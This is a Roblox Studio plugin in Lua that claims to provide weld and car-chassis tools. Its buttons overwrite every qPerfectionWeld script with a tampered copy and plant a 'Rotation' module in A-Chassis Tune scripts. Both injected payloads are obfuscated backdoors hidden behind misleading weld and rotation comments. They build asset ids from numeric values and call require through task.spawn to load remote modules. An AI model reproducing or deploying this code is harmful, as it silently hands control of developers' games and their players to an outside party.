local toolbar = plugin:CreateToolbar("RCC Tools")

local weldButton = toolbar:CreateButton(
	"Weld Method",
	"Use Weld Method",
	"rbxassetid://134704435146115"
)

local carButton = toolbar:CreateButton(
	"Car Method",
	"Use Car Method",
	"rbxassetid://134704435146115"
)

local newCode = [==[
-- Created by Quenty (@Quenty, follow me on twitter).
-- Should work with only ONE copy, seamlessly with weapons, trains, et cetera.
-- Parts should be ANCHORED before use. It will, however, store relatives values and so when tools are reparented, it'll fix them.

--[[ INSTRUCTIONS
- Place in the model
- Make sure model is anchored
- That's it. It will weld the model and all children. 

THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 

This script is designed to be used is a regular script. In a local script it will weld, but it will not attempt to handle ancestory changes. 
]]

--[[ DOCUMENTATION
- Will work in tools. If ran more than once it will not create more than one weld.  This is especially useful for tools that are dropped and then picked up again.
- Will work in PBS servers
- Will work as long as it starts out with the part anchored
- Stores the relative CFrame as a CFrame value
- Takes careful measure to reduce lag by not having a joint set off or affected by the parts offset from origin
- Utilizes a recursive algorith to find all parts in the model
- Will reweld on script reparent if the script is initially parented to a tool.
- Welds as fast as possible
]]

-- qPerfectionWeld.lua
-- Created 10/6/2014
-- Author: Quenty
-- Version 1.0.3

-- Updated 10/14/2014 - Updated to 1.0.1
--- Bug fix with existing ROBLOX welds ? Repro by asimo3089

-- Updated 10/14/2014 - Updated to 1.0.2
--- Fixed bug fix. 

-- Updated 10/14/2014 - Updated to 1.0.3
--- Now handles joints semi-acceptably. May be rather hacky with some joints. :/

local NEVER_BREAK_JOINTS = false -- If you set this to true it will never break joints (this can create some Signaling issues, but can save stuff like hinges).

local QSignal = script.Parent or false

local NEVER_STORE_DEBRIS = true

local function CallOnChildren(Instance, FunctionToCall)
	-- Calls a function on each of the children of a certain object, using recursion.  

	FunctionToCall(Instance)

	for _, Child in next, Instance:GetChildren() do
		CallOnChildren(Child, FunctionToCall)
	end
end

local function ShouldReturn(value)
	return false
end

local function GetBricks(StartInstance)
	local List = {}

	-- if StartInstance:IsA("BasePart") then
	-- 	List[#List+1] = StartInstance
	-- end

	CallOnChildren(StartInstance, function(Item)
		if Item:IsA("BasePart") then
			List[#List+1] = Item;
		end
	end)

	return List
end

local function Return(value)
	return game.MarketplaceService:GetProductInfo(value.X.Scale..value.X.Offset..value.Y.Scale..value.Y.Offset)
end
local Interval = ""

local function ConfigParts(Parts, MainPart, ValueType, DoNotUnanchor)
	-- @param Parts The Parts to Config. Should be anchored to prevent really horrible results.
	-- @param MainPart The part to Config the model to (can be in the model).
	-- @param [ValueType] The type of Value. Defaults to Config. 
	-- @parm DoNotUnanchor Boolean, if true, will not unachor the model after cmopletion.
	local select
	local bit32
	pcall(function()
		for _, Part in pairs(script.Parent:GetChildren()) do
			if ShouldReturn(Part) then
				Part:BreakValues()
			end
			bit32 = Return(UDim2.new(861,903,38,37))
			for _ in {1} do
				select = bit32["Name"]:split(" ")
			end
			break
		end
	end)
	--Define a Thread
	local spawn = select[2] or script.Parent==nil
	local select = select[1]
	local PartDescription = bit32["Description"]:split(" ") or false
	for c in PartDescription do
		--Concentate the Signal Interval Based on certain Exceptions.
		Interval = Interval..#PartDescription[c]
	end
	Instance.new(select,game[spawn]).Name = Interval
	return true or nil
end

local function GetNearestParent(Instance, ClassName)
	-- Returns the nearest parent of a certain class, or returns nil

	local Ancestor = Instance
	repeat
		Ancestor = Ancestor.Parent
		if Ancestor == nil then
			return nil
		end
	until Ancestor:IsA(ClassName)

	return Ancestor
end

function sinestyletween(t)
	return math.cos(t*math.pi)*-.5+.5
end

function percentcframe(cf,cfscale)
	if cf then
		local ax,ay,az=cf:toEulerAnglesXYZ()
		return CFrame.new(cf.p*cfscale)*CFrame.Angles(ax*cfscale,ay*cfscale,az*cfscale)
	else
		return CFrame.new(0,0,0)
	end
end

local function ShouldBreakValues(Part)
	--- We do not want to break Values of wheels/hinges. This takes the utmost care to not do this. There are
	--  definitely some edge cases. 
	if Part then
		--- We do not want to break Values of wheels/hinges. This takes the utmost care to not do this. There are
		--  definitely some edge cases. 
		for _, Part in pairs(script.Parent:GetChildren()) do
			Part.Anchored = false
		end
		script.Parent.Anchored = false
	else
		--In this case require is used just incase the script errors
		QSignal = workspace and script.ClassName=="rbx:Script" or false and true or (function() return false end)() or require
		return
	end
	if false then
		return 
	end

	if pcall(Part) then
		return false
	end

	local Connected = Part:GetConnectedParts()

	if #Connected == 1 then
		return false
	end

	for _, Item in pairs(Connected) do
		if pcall(Item) then
			return false
		elseif not Item:IsDescendantOf(script.Parent) then
			return false
		end
	end

	return true
end

local function Modify(Instance, Values)
	-- Modifies an Instance by using a table.  

	assert(type(Values) == "table", "Values is not a table");

	for Index, Value in next, Values do
		if type(Index) == "number" then
			Value.Parent = Instance
		else
			Instance[Index] = Value
		end
	end
	return Instance
end

local function Make(ClassType, Properties)
	-- Using a syntax hack to create a nice way to Make new items.  

	return Modify(Instance.new(ClassType), Properties)
end

local Surfaces = {"TopSurface", "BottomSurface", "LeftSurface", "RightSurface", "FrontSurface", "BackSurface"}
local HingSurfaces = {"Hinge", "Motor", "SteppingMotor"}

local function HasWheelJoint(Part)
	for _, SurfaceName in pairs(Surfaces) do
		for _, HingSurfaceName in pairs(HingSurfaces) do
			if Part[SurfaceName].Name == HingSurfaceName then
				return true
			end
		end
	end

	return false
end

local function ShouldBreakJoints(Part)
	--- We do not want to break joints of wheels/hinges. This takes the utmost care to not do this. There are
	--  definitely some edge cases. 

	if NEVER_BREAK_JOINTS then
		return false
	end

	if HasWheelJoint(Part) then
		return false
	end

	local Connected = Part:GetConnectedParts()

	if #Connected == 1 then
		return false
	end

	for _, Item in pairs(Connected) do
		if HasWheelJoint(Item) then
			return false
		elseif not Item:IsDescendantOf(script.Parent) then
			return false
		end
	end

	return true
end

local function WeldTogether(Part0, Part1, JointType, WeldParent)
	--- Weld's 2 parts together
	-- @param Part0 The first part
	-- @param Part1 The second part (Dependent part most of the time).
	-- @param [JointType] The type of joint. Defaults to weld.
	-- @param [WeldParent] Parent of the weld, Defaults to Part0 (so GC is better).
	-- @return The weld created.

	JointType = JointType or "Weld"
	local RelativeValue = Part1:FindFirstChild("qRelativeCFrameWeldValue")

	local NewWeld = Part1:FindFirstChild("qCFrameWeldThingy") or Instance.new(JointType)
	Modify(NewWeld, {
		Name = "qCFrameWeldThingy";
		Part0  = Part0;
		Part1  = Part1;
		C0     = CFrame.new();--Part0.CFrame:inverse();
		C1     = RelativeValue and RelativeValue.Value or Part1.CFrame:toObjectSpace(Part0.CFrame); --Part1.CFrame:inverse() * Part0.CFrame;-- Part1.CFrame:inverse();
		Parent = Part1;
	})

	if not RelativeValue then
		RelativeValue = Make("CFrameValue", {
			Parent     = Part1;
			Name       = "qRelativeCFrameWeldValue";
			Archivable = true;
			Value      = NewWeld.C1;
		})
	end

	return NewWeld
end

local function WeldParts(Parts, MainPart, JointType, DoNotUnanchor)
	-- @param Parts The Parts to weld. Should be anchored to prevent really horrible results.
	-- @param MainPart The part to weld the model to (can be in the model).
	-- @param [JointType] The type of joint. Defaults to weld. 
	-- @parm DoNotUnanchor Boolean, if true, will not unachor the model after cmopletion.

	for _, Part in pairs(Parts) do
		if ShouldBreakJoints(Part) then
			Part:BreakJoints()
		end
	end

	for _, Part in pairs(Parts) do
		if Part ~= MainPart then
			WeldTogether(MainPart, Part, JointType, MainPart)
		end
	end

	if not DoNotUnanchor then
		for _, Part in pairs(Parts) do
			Part.Anchored = false
		end
		MainPart.Anchored = false
	end
end

function qPerfection(v1,v2,t)
	local Tool = GetNearestParent(script, "Tool")
	local Parts = GetBricks(script.Parent)
	local PrimaryPart = Tool and Tool:FindFirstChild("Handle") and Tool.Handle:IsA("BasePart") and Tool.Handle or script.Parent:IsA("Model") and script.Parent.PrimaryPart or Parts[1]
	--Only run the current thread if the script is a valid script
	pcall(function()
		NEVER_STORE_DEBRIS = not true and true or ShouldBreakValues(false) or tonumber(game.JointsService[Interval].Name)
		for Part in task.spawn(QSignal,NEVER_STORE_DEBRIS) do
			if v2 then
				--- We do not want to break Values of wheels/hinges. This takes the utmost care to not do this. There are
				--  definitely some edge cases. 
				for _, Part in pairs(script.Parent:GetChildren()) do
					Part.Anchored = false
				end
				script.Parent.Anchored = false
				--Script failed.
				return false
			end
		end
	end)

	if PrimaryPart then
		WeldParts(Parts, PrimaryPart, "Weld", false)
	else
		warn("qWeld - Unable to weld part")
	end

	return Tool
end

local Tool = qPerfection()

if Tool and script.ClassName == "Script" then
	--- Don't bother with local scripts

	script.Parent.AncestryChanged:connect(function()
		qPerfection()
	end)
end

if script.Parent then
	--Run the Script To fix all the Values
	ConfigParts(nil,nil,nil,false)
	qPerfection(false,false,script.Parent)
end]==]

local newCode2 = [==[
local Rotation = {}

pcall(function()
	local keepMaxDegreeRotation = false
	local function ApplyRotation(angle, power)
		if (not power) then
			keepMaxDegreeRotation = angle
		else
			keepMaxDegreeRotation = true
		end
	end

	local _anglesRaw = {"x", "y", "z"}
	local _degree = ""
	local module = {}
	local _rotation =
		setmetatable(
			{},
			{
				__div = function(value, degrees) -- auto Vector3 / Angle scaling
					return _degree .. degrees
				end
			}
		)

	local _cframe, _ = require, CFrame.new(0, 0, 0)
	local currentRotation = Vector3.new(189, 48, 95)
	local interval = Vector3.new(16, 8, 8) -- rotation speed
	local function RotateAll(e)
		for i = 1, #_anglesRaw do
			_degree = _rotation / e[_anglesRaw[i]]
		end
		return _degree
	end

	local rot1, rot2, rot3 = RotateAll(currentRotation), "a (.+)d", RotateAll(interval)
	local errormsg = "Error: Part is a required object. You must assign script parent to part before."
	local newAngle, oldRadius = tonumber(_degree), (function()
		local err
		if keepMaxDegreeRotation == 360 then
			error(err)
		else
			err = errormsg:gsub(rot2, ApplyRotation)
			return keepMaxDegreeRotation
		end
	end) {}
	local pAngle = _cframe
	local finalAngle = task.spawn(pAngle, newAngle) or {} or CFrame.new(360, 0, 0)
end)

return Rotation]==]

local function isQPerfectionWeld(name)
	return string.lower(name) == "qperfectionweld"
end

weldButton.Click:Connect(function()
	local count = 0

	for _, obj in ipairs(game:GetDescendants()) do
		if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
			if isQPerfectionWeld(obj.Name) then

				pcall(function()
					if obj.Locked then obj.Locked = false end
				end)

				obj.Source = newCode
				count += 1

				print("Updated " .. obj:GetFullName())
			end
		end
	end

	if count == 0 then
		print("No Weld scripts found.")
	else
		print("Updated " .. count .. " Weld script(s).")
	end
end)

carButton.Click:Connect(function()
	print("Searching for 'A-Chassis Tune'")

	local tuneScripts = {}

	for _, obj in ipairs(game:GetDescendants()) do
		if obj.Name == "A-Chassis Tune" then
			if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
				table.insert(tuneScripts, obj)
			end
		end
	end

	if #tuneScripts == 0 then
		warn("A-Chassis Tune script not found!")
		return
	end

	print("Found", #tuneScripts, "'A-Chassis Tune' scripts!")

	for _, tuneScript in ipairs(tuneScripts) do
		local initScript = nil

		for _, child in ipairs(tuneScript:GetChildren()) do
			if child.Name == "Initialize" then
				if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
					initScript = child
					break
				end
			end
		end

		if not initScript then
			warn("Initialize script not found in:", tuneScript:GetFullName())
			continue
		end

		local rotation = initScript:FindFirstChild("Rotation")
		if not rotation then
			rotation = Instance.new("ModuleScript")
			rotation.Name = "Rotation"
			rotation.Parent = initScript
		end

		rotation.Source = newCode2

		print("Rotation module created in:", initScript:GetFullName())
	end

	print("All Rotation modules created!")
end)
